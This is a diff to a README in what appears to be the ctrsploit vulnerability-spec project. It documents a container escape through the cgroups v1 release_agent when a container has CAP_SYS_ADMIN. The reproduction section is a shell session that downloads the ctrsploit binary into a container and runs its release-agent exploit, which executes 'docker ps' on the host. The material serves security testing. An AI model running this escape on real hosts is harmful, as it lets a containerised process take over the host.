@@ -10,9 +10,9 @@ changelog:
 
 ---
 
-# CAP_SYS_ADMIN
+# release agent escape 
 
-[edit](https://github.com/ctrsploit/sploit-spec/edit/main/vul/sys_admin/README.md)
+[edit](https://github.com/ctrsploit/sploit-spec/edit/main/vul/sys_admin/release_agent/README.md)
 
 ## 1. Vulnerability Overview
 
@@ -25,10 +25,14 @@ Insecure configuration
 ## 3. Prerequisites
 
 1. cap_sys_admin
+2. root user in container
+3. cgroups v1
+4. top level cgroups subsystem
+5. allow mount syscall
 
 ## 4. Vulnerability Existence Check
 
-`ctrsploit checksec sys_admin`
+`ctrsploit checksec release_agent`
 
 ## 5. Reproduce
 
@@ -104,13 +108,13 @@ WARNING: No swap limit support
 root@localhost:~# docker run -ti --name poc --cap-add CAP_SYS_ADMIN --security-opt apparmor=unconfined busybox
 / # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
 / # chmod +x /usr/bin/ctrsploit
-/ # ctrsploit --colorful checksec sys_admin
-✔  cap_sys_admin	# Container can be escaped when has cap_sys_admin
+/ # ctrsploit --colorful checksec release_agent
+✔  release_agent	# Container can be escaped when has cap_sys_admin and use cgroups v1
 
-/ # ctrsploit exploit sys_admin ra -c "docker ps "
+/ # ctrsploit exploit ra -c 'docker ps '
 INFO[0001] 
 ===========start of result==============
 CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
-059c89ef2556        busybox             "sh"                49 seconds ago      Up 48 seconds                           poc
+4a2fe985bd56        busybox             "sh"                33 seconds ago      Up 31 seconds                           poc
 ===========end of result==============
 ```
